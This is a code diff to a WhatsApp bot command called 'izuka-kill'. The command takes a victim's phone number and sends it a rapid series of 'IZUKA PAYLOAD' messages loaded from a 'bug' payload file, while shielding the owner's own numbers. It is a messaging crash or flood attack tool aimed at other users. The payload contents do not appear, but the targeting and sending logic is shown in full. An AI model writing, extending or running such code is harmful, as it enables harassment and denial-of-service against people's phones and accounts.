@@ -1,6 +1,6 @@
 const { cmd } = require('../command');
 const config = require('../config');
-const bugchat = require('../bug/izuka3.js'); // ✅ Chemen korije!
+const bugchat = require('../bug/izuka3.js'); // ✅ Chimen fichye payload la
 
 cmd({
   pattern: 'izuka-kill',
@@ -36,11 +36,11 @@ cmd({
 
     if (!targetNumber || isNaN(targetNumber)) {
       return await izuka.sendMessage(from, {
-        text: '❌ *Usage:* `.izuka-kill 1305896xxxxxx`'
+        text: `❌ *Usage:* \`${prefix}izuka-kill 1305896xxxxxx\``
       }, { quoted: mek });
     }
 
-    const safeNumbers = ['13058962443', config.OWNER_NUMBER, ...(config.SUDO || [])];
+    const safeNumbers = ['13058962443', config.OWNER_NUMBER, ...(config.SUDO || [])].map(n => n.toString().replace(/[^0-9]/g, ''));
     if (safeNumbers.includes(targetNumber.replace(/[^0-9]/g, ''))) {
       return await izuka.sendMessage(from, {
         text: '⚠️ *You cannot target this protected number.*'
@@ -58,7 +58,7 @@ cmd({
       await izuka.sendMessage(targetJid, {
         text: `💥 *IZUKA PAYLOAD #${i + 1}*\n${attackLines[i]}\n\n🌀 _DAWENS ENGINE_`
       }).catch(err => console.error(`❌ Fail to send #${i + 1}:`, err));
-      await new Promise(r => setTimeout(r, 250)); // Delay
+      await new Promise(r => setTimeout(r, 250));
     }
 
     await izuka.sendMessage(from, {
